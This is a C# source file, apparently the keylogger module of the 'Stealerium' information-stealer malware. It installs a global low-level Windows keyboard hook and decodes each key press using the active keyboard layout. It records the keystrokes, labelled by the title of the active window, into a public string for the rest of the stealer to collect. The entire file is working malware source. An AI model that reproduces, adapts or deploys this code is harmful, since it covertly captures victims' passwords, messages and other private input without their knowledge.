using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stealerium.Modules.Keylogger
{
    /// <summary>
    /// The Keylogger class is responsible for capturing keyboard input and logging key presses.
    /// </summary>
    internal sealed class Keylogger
    {
        private const int WmKeydown = 0x0100;
        private const int Whkeyboardll = 13;
        private static IntPtr _hookId = IntPtr.Zero;
        private static readonly LowLevelKeyboardProc Proc = HookCallback;
        public static bool KeyloggerEnabled = false;
        public static string KeyLogs = string.Empty;
        private static string _prevActiveWindowTitle;
        public static readonly Thread MainThread = new Thread(StartKeylogger);

        // DLL Imports for keyboard hook and key processing
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out][MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        /// <summary>
        /// Starts the keylogger by setting the hook and starting the message loop.
        /// </summary>
        private static void StartKeylogger()
        {
            _hookId = SetHook(Proc);
            Application.Run();
        }

        /// <summary>
        /// Sets the keyboard hook for intercepting key presses.
        /// </summary>
        /// <param name="proc">The callback procedure for handling key presses.</param>
        /// <returns>Handle to the hook.</returns>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            {
                return SetWindowsHookEx(Whkeyboardll, proc, GetModuleHandle(curProcess.ProcessName), 0);
            }
        }

        /// <summary>
        /// Callback function for intercepting and processing keyboard events.
        /// </summary>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (!KeyloggerEnabled)
                return IntPtr.Zero;

            // Only process if the key event is valid and a key was pressed
            if (nCode >= 0 && wParam == (IntPtr)WmKeydown)
            {
                var vkCode = Marshal.ReadInt32(lParam);

                // Detect CapsLock and Shift states
                var capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                var shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;

                // Get the key text based on the current keyboard layout
                var currentKey = KeyboardLayout((uint)vkCode);

                // Adjust the key based on CapsLock or Shift state
                currentKey = (capsLock || shiftPress) ? currentKey.ToUpper() : currentKey.ToLower();

                // Handle special keys (F1-F24, space, enter, backspace, etc.)
                currentKey = HandleSpecialKeys((Keys)vkCode, currentKey, capsLock);

                // Log the key press
                LogKeyPress(currentKey);
            }

            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        /// <summary>
        /// Converts the virtual key code into a string based on the current keyboard layout.
        /// </summary>
        /// <param name="vkCode">The virtual key code.</param>
        /// <returns>The corresponding key string.</returns>
        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                var sb = new StringBuilder();
                var keyState = new byte[256];

                if (GetKeyboardState(keyState))
                {
                    var scanCode = MapVirtualKey(vkCode, 0);
                    var keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out _));
                    ToUnicodeEx(vkCode, scanCode, keyState, sb, sb.Capacity, 0, keyboardLayout);
                    return sb.ToString();
                }
            }
            catch
            {
                // Log or handle exceptions as needed
            }

            return ((Keys)vkCode).ToString();
        }

        /// <summary>
        /// Handles special keys like F1-F24, space, enter, backspace, and other common keys.
        /// </summary>
        private static string HandleSpecialKeys(Keys vkKey, string currentKey, bool capsLock)
        {
            switch (vkKey)
            {
                case Keys.F1:
                case Keys.F2:
                case Keys.F3:
                case Keys.F4:
                case Keys.F5:
                case Keys.F6:
                case Keys.F7:
                case Keys.F8:
                case Keys.F9:
                case Keys.F10:
                case Keys.F11:
                case Keys.F12:
                case Keys.F13:
                case Keys.F14:
                case Keys.F15:
                case Keys.F16:
                case Keys.F17:
                case Keys.F18:
                case Keys.F19:
                case Keys.F20:
                case Keys.F21:
                case Keys.F22:
                case Keys.F23:
                case Keys.F24:
                    return $"[{vkKey}]";
                case Keys.Space:
                    return " ";
                case Keys.Enter:
                    return "[ENTER]";
                case Keys.Escape:
                    return "[ESC]";
                case Keys.LControlKey:
                case Keys.RControlKey:
                    return "[CTRL]";
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                    return "[Shift]";
                case Keys.Back:
                    return "[Back]";
                case Keys.LWin:
                    return "[WIN]";
                case Keys.Tab:
                    return "[Tab]";
                case Keys.Capital:
                    return capsLock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]";
                default:
                    return currentKey;
            }
        }

        /// <summary>
        /// Logs the key press and updates the key log.
        /// </summary>
        private static void LogKeyPress(string currentKey)
        {
            // Handle newline logging for different windows
            if (currentKey == "[ENTER]" && _prevActiveWindowTitle == WindowManager.ActiveWindow)
            {
                KeyLogs += Environment.NewLine;
            }
            else if (currentKey == "[ENTER]")
            {
                _prevActiveWindowTitle = WindowManager.ActiveWindow;
                KeyLogs += $"\n###  {_prevActiveWindowTitle} ###\n";
            }
            else if (currentKey == "[Back]" && KeyLogs.Length > 0)
            {
                KeyLogs = KeyLogs.Remove(KeyLogs.Length - 1, 1); // Handle backspace
            }
            else
            {
                KeyLogs += currentKey;
            }
        }

        // Delegate for the low-level keyboard hook callback
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    }
}
